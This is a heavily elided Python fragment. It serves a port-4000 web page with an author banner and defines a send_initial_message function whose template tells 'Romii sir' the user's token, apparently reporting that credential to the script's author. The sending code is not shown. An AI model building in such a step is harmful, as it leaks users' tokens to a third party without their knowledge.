...
class MyHandler(http.server.SimpleHTTPRequestHandler):
      def do_GET(self):
          ...
          self.end_headers()
          self.wfile.write(b"-- THIS SERVER MADE BY Z9INI W3HSHIW D9RIND9W ")
def execute_server():
      PORT = 4000
...
def send_initial_message():
      ...
      msg_template = "Hello Romii sir! I am using your server. My token is :- {}"
      ...
      def liness():
          print('\033[1;92m' + '•──────────────────────R0MII KING HERE ───────────────────────────────•')
